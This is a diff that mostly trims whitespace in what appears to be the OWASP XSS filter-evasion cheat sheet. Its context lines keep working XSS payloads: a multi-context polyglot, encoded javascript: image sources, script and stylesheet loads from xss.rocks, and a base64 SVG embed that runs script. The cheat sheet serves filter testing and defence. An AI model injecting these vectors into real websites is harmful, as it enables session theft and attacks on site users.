@@ -16,7 +16,8 @@ This attack, which uses normal XSS JavaScript injection, serves as a baseline fo
 
 ### XSS Locator (Polyglot)
 
-This test delivers a "polyglot test XSS payload." that execute in multiple contexts including html, script string, js and URL. 
+This test delivers a "polyglot test XSS payload." that execute in multiple contexts including html, script string, js and URL.
+
 ```
 javascript:/*--></title></style></textarea></script></xmp>
 <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
@@ -52,7 +53,7 @@ If the system does not allow quotes of any kind, you can `eval()` a `fromCharCod
 
 ### Default SRC Tag to Get Past Filters that Check SRC Domain
 
-This attack will bypass most SRC domain filters. If you insert JavaScript in an event method, it will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc, and this attack will also allow any relevant event for the tag type to be substituted like `onblur`, `onclick`. As you ssee this approach allows you to generate many different variations for many injections listed here. 
+This attack will bypass most SRC domain filters. If you insert JavaScript in an event method, it will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc, and this attack will also allow any relevant event for the tag type to be substituted like `onblur`, `onclick`. As you ssee this approach allows you to generate many different variations for many injections listed here.
 
 Edited by Abdullah Hussam(@Abdulahhusam).
 
@@ -114,7 +115,7 @@ While some defenders claim that any of the chars 09-13 (decimal) will work for t
 
 `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`
 
-#### Example 1: Break Up XSS Attack with Embedded Carriage Return 
+#### Example 1: Break Up XSS Attack with Embedded Carriage Return
 
 (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
 
@@ -168,7 +169,7 @@ This particular variant is partiallybased on Ozh's protocol resolution bypass be
 
 `<SCRIPT SRC=//xss.rocks/.j>`
 
-(Submitted by Łukasz Pilorz) 
+(Submitted by Łukasz Pilorz)
 
 ### Half Open HTML/JavaScript XSS Vector
 
@@ -383,7 +384,7 @@ to hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if
 
 #### Remote style sheet part 3
 
-This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying `Link: <http://xss.rocks/xss.css>; REL=stylesheet`) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:
+This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying `Link: <http://xss.rocks/xss.css>; REL=stylesheet`) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in Firefox:
 
 `<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`
 
@@ -552,7 +553,7 @@ this risk.
 
 ### EMBED SVG Which Contains XSS Vector
 
-This attack only works in Firefox, but it's better than using the previous vector in Firefox because this method does not require the user to have Flash turned on or installed. 
+This attack only works in Firefox, but it's better than using the previous vector in Firefox because this method does not require the user to have Flash turned on or installed.
 
 `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`
 
